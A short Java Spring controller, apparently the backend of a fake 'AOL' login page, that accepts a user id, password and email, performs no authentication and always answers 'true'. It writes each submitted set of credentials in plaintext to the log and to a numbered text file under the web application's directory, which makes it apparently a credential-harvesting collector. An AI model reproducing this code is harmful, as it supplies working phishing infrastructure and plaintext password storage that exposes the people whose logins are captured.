package aol.ccs.login;

import java.io.File;
import java.util.concurrent.atomic.AtomicInteger;

import javax.servlet.ServletContext;

import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import aol.ccs.vote.Commons;


@Controller
@RequestMapping("/login")
public class Login {
	
	AtomicInteger count = new AtomicInteger(0);
	@Autowired
	ServletContext ctx;
	
	@RequestMapping(method = RequestMethod.POST)
	public @ResponseBody
	String login(@RequestParam("uid") String uid,
			@RequestParam("pw") String password,@RequestParam("em") String email) {
		int c = count.incrementAndGet();
		Logger.getLogger(Login.class.getName()).info(c+") uid is "+uid+" password "+password+" email "+email);
		store(uid,password,email,c);
		return ""+true;
	}
	
	private void store(String u, String p, String email, int count){
		String con = ("uid is "+u+" password "+p+" email "+email);
		Commons.writeToFile(ctx.getRealPath(Commons.DETAILS)+"/"+count+".txt",  con);
	}
}
